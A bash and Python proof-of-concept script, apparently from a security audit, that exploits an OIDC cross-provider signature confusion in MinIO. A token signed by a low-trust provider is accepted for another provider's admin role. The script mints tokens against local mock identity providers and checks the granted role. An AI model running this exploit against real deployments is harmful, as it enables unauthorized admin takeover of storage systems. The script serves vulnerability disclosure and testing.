#!/usr/bin/env bash
# F-03 — OIDC cross-provider signature confusion -> admin takeover.
# A JWT signed by low-trust provider B's key, carrying A's audience, is accepted for A's admin
# role because MinIO resolves the JWKS key by `kid` from a Config-wide shared map and never
# validates `iss`.
# Prereq: setup/01 (node A on :19000 — use exact-HEAD) then setup/03-dual-oidc.sh
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"
HERE="$(cd "$(dirname "$0")" && pwd)"

# discover the two role ARNs and which one a valid provider-A token maps to (= admin role)
echo "=== discovering role ARNs and running the cross-provider attack ==="
python3 - "$NODE_A" "$HERE" <<'PY'
import sys, subprocess, urllib.request, urllib.parse, urllib.error, re, json
MINIO, HERE = sys.argv[1], sys.argv[2]
MINT = f"{HERE}/../../harness/mock_idp.py"
def mint(prov,iss,aud,sub,exp="3600"):
    return subprocess.check_output(["python3",MINT,"mint",prov,iss,aud,sub,exp]).decode().strip()
def assume(tok,arn):
    d=urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15","WebIdentityToken":tok,"RoleArn":arn}).encode()
    r=urllib.request.Request(MINIO+"/",data=d,method="POST",headers={"Content-Type":"application/x-www-form-urlencoded"})
    try: b=urllib.request.urlopen(r,timeout=15).read().decode(); c=200
    except urllib.error.HTTPError as e: b=e.read().decode(); c=e.code
    st=(re.search("<SessionToken>([^<]+)",b) or [None,None])[1]
    return c, st
# find ARNs: use the minio admin config or brute two candidate ARNs from the mint of provider A
import os
# read ARNs from node A log if present
arns=[]
for lg in ("/tmp/nodeA.log",):
    if os.path.exists(lg):
        arns=sorted(set(re.findall(r'arn:minio:iam:::role/[A-Za-z0-9_-]+', open(lg).read())))
if not arns:
    print("Could not read role ARNs from /tmp/nodeA.log — run setup/03-dual-oidc.sh first."); sys.exit(1)
# map: provider-A token (aud=clientA) -> the ARN it is accepted for = admin role
tA=mint("a","http://127.0.0.1:8801","clientA","alice")
adminArn=None
for arn in arns:
    c,st=assume(tA,arn)
    if c==200: adminArn=arn
print("admin role ARN:", adminArn)
def claims(st):
    p=st.split(".")[1]; p+="="*(-len(p)%4)
    import base64; return json.loads(base64.urlsafe_b64decode(p))
print("\n[ATTACK] token signed by provider B's key (iss=B) with A's audience -> assume A's admin role")
tX=mint("b","http://127.0.0.1:8802","clientA","attacker")
c,st=assume(tX,adminArn)
print(f"  issue -> HTTP {c}")
if st:
    cl=claims(st)
    print(f"  session-token: iss={cl.get('iss')} (B!)  aud={cl.get('aud')}  roleArn={cl.get('roleArn')} (A/admin!)  sub={cl.get('sub')}")
    print("  >>> VULNERABLE: B-signed token with B's issuer was granted A's admin role.")
print("\n[control] same B-signed token with B's OWN audience (clientB) on A's admin role:")
tC=mint("b","http://127.0.0.1:8802","clientB","x")
c,_=assume(tC,adminArn)
print(f"  issue -> HTTP {c} (expected 400 rejected)")
PY
